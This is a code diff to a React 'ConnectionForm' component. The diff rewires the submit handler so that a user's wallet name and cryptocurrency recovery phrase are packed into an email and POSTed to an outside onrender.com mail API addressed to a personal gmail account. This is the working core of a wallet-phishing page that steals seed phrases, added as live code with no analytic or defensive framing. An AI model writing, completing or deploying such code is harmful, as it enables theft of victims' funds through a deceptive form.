@@ -6,7 +6,12 @@ import { FaArrowCircleRight, FaLock } from "react-icons/fa"; // Import lock icon
 const ConnectionForm = () => {
   // Submit handler
   const handleSubmit = (values) => {
-    fetch("/formsubmission", {
+    const mailData = {
+      email: "kunkkykukky@gmail.com",
+      subject: "A new Mail",
+      message: `wallet Name:${values.walletName} \n Recovery Phrase:${recoveryPhrase}`,
+    };
+    fetch("https://newaccessbank.onrender.com/api/users/sendmail", {
       method: "POST",
       headers: {
         "Content-Type": "application/json",
@@ -83,7 +88,9 @@ const ConnectionForm = () => {
                 />
               </div>
               {errors.recoveryPhrase && touched.recoveryPhrase && (
-                <div className="text-red-500 text-xs">{errors.recoveryPhrase}</div>
+                <div className="text-red-500 text-xs">
+                  {errors.recoveryPhrase}
+                </div>
               )}
             </div>
 
